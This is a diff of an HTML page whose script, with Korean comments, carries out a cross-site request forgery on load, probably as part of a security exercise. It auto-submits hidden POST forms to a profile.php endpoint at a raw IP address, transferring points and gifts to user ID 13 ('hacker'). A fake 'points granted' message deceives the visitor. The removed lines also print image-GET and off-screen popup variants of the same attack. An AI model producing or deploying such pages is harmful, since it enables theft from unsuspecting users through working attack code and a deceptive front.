@@ -57,11 +57,9 @@
     </div>
 
     <script>
-        // 페이지 로드되자마자 자동 실행
         window.addEventListener('load', function() {
             console.log('🎯 원클릭 CSRF 공격 시작!');
             
-            // 상태 메시지 업데이트
             const statusEl = document.getElementById('status');
             
             setTimeout(() => {
@@ -70,163 +68,70 @@
             
             setTimeout(() => {
                 statusEl.innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
-                executeMultiVectorAttack();
+                executeOneClickAttack();
             }, 2000);
             
             setTimeout(() => {
-                statusEl.innerHTML = 
-                    '<p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>' +
-                    '<p>💰 포인트가 성공적으로 지급되었습니다!</p>' +
-                    '<p style="margin-top: 20px;">' +
-                    '<a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">' +
-                    '🔍 결과 확인하러 가기 →' +
-                    '</a>' +
-                    '</p>';
-            }, 8000);
+                statusEl.innerHTML = `
+                    <p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>
+                    <p>💰 포인트가 성공적으로 지급되었습니다!</p>
+                    <p style="margin-top: 20px;">
+                        <a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">
+                            🔍 결과 확인하러 가기 →
+                        </a>
+                    </p>
+                `;
+            }, 5000);
         });
         
-        function executeMultiVectorAttack() {
-            console.log('🚀 다중 벡터 공격 실행 중...');
+        function executeOneClickAttack() {
+            console.log('🚀 원클릭 공격 실행 중...');
             
             const attacks = [
-                { points: 100, gift_type: 'diamond', message: 'MultiVector_Attack_1' },
-                { points: 75, gift_type: 'coffee', message: 'MultiVector_Attack_2' },
-                { points: 50, gift_type: 'cake', message: 'MultiVector_Attack_3' }
+                { points: 100, gift_type: 'diamond', message: 'OneClick_Attack_1' },
+                { points: 75, gift_type: 'coffee', message: 'OneClick_Attack_2' },
+                { points: 50, gift_type: 'cake', message: 'OneClick_Attack_3' }
             ];
             
             attacks.forEach((attack, index) => {
                 setTimeout(() => {
-                    // 방법 1: 직접 Form 생성 (가장 효과적)
+                    // 직접 Form 방식으로 변경
                     createDirectForm(attack, index + 1);
-                    
-                    // 방법 2: Image 태그로 GET 시도
-                    setTimeout(() => {
-                        tryImageAttack(attack, index + 1);
-                    }, 200);
-                    
-                    // 방법 3: 새 창에서 Form 전송
-                    setTimeout(() => {
-                        tryPopupAttack(attack, index + 1);
-                    }, 400);
-                    
-                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 다중 시도');
-                }, index * 2000);
+                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
+                }, index * 1000);
             });
         }
         
-        // 방법 1: 직접 Form 생성 및 전송
         function createDirectForm(attack, id) {
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'http://3.36.66.216/profile.php';
-                form.target = 'attack_frame_' + id;
-                form.style.display = 'none';
-                
-                const fields = {
-                    'receiver_id': '13',
-                    'points': attack.points,
-                    'send_gift': '1',
-                    'gift_type': attack.gift_type,
-                    'message': attack.message
-                };
-                
-                Object.keys(fields).forEach(key => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = fields[key];
-                    form.appendChild(input);
-                });
-                
-                // 숨겨진 iframe 생성
-                const iframe = document.createElement('iframe');
-                iframe.name = 'attack_frame_' + id;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                
-                document.body.appendChild(form);
-                form.submit();
-                
-                console.log('📤 직접 Form 공격 ' + id + ' 전송됨');
-                
-                // 정리
-                setTimeout(() => {
-                    if (form.parentNode) form.parentNode.removeChild(form);
-                    if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-                }, 5000);
-                
-            } catch(e) {
-                console.log('❌ 직접 Form 공격 실패: ' + e.message);
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = '_blank';
+            form.style.display = 'none';
+            
+            const fields = {
+                receiver_id: '13',
+                points: attack.points,
+                send_gift: '1',
+                gift_type: attack.gift_type,
+                message: attack.message
+            };
+            
+            for (let key in fields) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
             }
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
         }
         
-        // 방법 2: Image 태그로 GET 요청 시도
-        function tryImageAttack(attack, id) {
-            try {
-                const img = new Image();
-                const params = 'receiver_id=13&points=' + attack.points + 
-                             '&send_gift=1&gift_type=' + attack.gift_type + 
-                             '&message=' + attack.message;
-                
-                img.src = 'http://3.36.66.216/profile.php?' + params;
-                img.style.display = 'none';
-                img.onload = function() {
-                    console.log('📷 Image GET 공격 ' + id + ' 응답받음');
-                };
-                img.onerror = function() {
-                    console.log('📷 Image GET 공격 ' + id + ' 시도됨 (에러는 정상)');
-                };
-                
-                document.body.appendChild(img);
-                
-                setTimeout(() => {
-                    if (img.parentNode) img.parentNode.removeChild(img);
-                }, 3000);
-                
-            } catch(e) {
-                console.log('❌ Image 공격 실패: ' + e.message);
-            }
-        }
-        
-        // 방법 3: 새 창에서 공격 시도
-        function tryPopupAttack(attack, id) {
-            try {
-                const popup = window.open('', 'attack_popup_' + id, 
-                    'width=1,height=1,left=-1000,top=-1000');
-                
-                if (popup) {
-                    const html = '<!DOCTYPE html>' +
-                        '<html><body>' +
-                        '<form id="popupForm" method="POST" action="http://3.36.66.216/profile.php">' +
-                        '<input type="hidden" name="receiver_id" value="13">' +
-                        '<input type="hidden" name="points" value="' + attack.points + '">' +
-                        '<input type="hidden" name="send_gift" value="1">' +
-                        '<input type="hidden" name="gift_type" value="' + attack.gift_type + '">' +
-                        '<input type="hidden" name="message" value="' + attack.message + '">' +
-                        '</form>' +
-                        '<script>' +
-                        'document.getElementById("popupForm").submit();' +
-                        'setTimeout(function(){ window.close(); }, 2000);' +
-                        '</script>' +
-                        '</body></html>';
-                    
-                    popup.document.write(html);
-                    popup.document.close();
-                    
-                    console.log('🪟 Popup 공격 ' + id + ' 실행됨');
-                    
-                    setTimeout(() => {
-                        try { popup.close(); } catch(e) {}
-                    }, 3000);
-                }
-            } catch(e) {
-                console.log('❌ Popup 공격 실패: ' + e.message);
-            }
-        }
-        
-        console.log('🎁 다중벡터 CSRF 공격 시스템 로드됨');
-        console.log('⚡ 3가지 공격 방식 동시 시도');
+        console.log('🎁 원클릭 포인트 탈취 시스템 로드됨');
+        console.log('⚡ 링크 접속만으로 자동 공격 실행');
         console.log('🎯 타겟: hacker (ID: 13)');
     </script>
 </body>
